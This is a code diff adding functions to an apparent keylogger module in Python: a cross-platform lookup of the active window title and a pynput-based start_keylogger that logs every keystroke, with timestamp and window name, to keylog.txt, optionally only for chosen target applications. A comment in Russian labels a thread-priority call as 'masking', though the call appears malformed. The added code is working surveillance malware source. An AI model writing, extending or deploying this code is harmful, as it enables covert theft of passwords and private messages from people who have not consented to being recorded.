@@ -579,6 +579,37 @@ class Keylogger:
         # Collect and return data
         return self.collect_data()
 
+def get_active_window():
+    # Кроссплатформенная функция получения активного окна
+    try:
+        if os.name == 'nt':
+            import win32gui
+            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        elif sys.platform == 'darwin':
+            from AppKit import NSWorkspace
+            return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
+        else:
+            import subprocess
+            return subprocess.check_output(['xdotool', 'getactivewindow', 'getwindowname']).decode().strip()
+    except Exception:
+        return "unknown"
+
+def start_keylogger(target_apps=None):
+    from pynput import keyboard
+    def on_press(key):
+        active_window = get_active_window()
+        if not target_apps or any(app.lower() in active_window.lower() for app in target_apps):
+            with open("keylog.txt", "a") as f:
+                f.write(f"{time.time()} {active_window} {key}\n")
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    # Маскировка потока (Windows)
+    try:
+        import ctypes
+        ctypes.windll.kernel32.SetThreadPriority(-2)  # BELOW_NORMAL_PRIORITY_CLASS
+    except Exception:
+        pass
+
 def main():
     """Main function to run the keylogger module."""
     try:
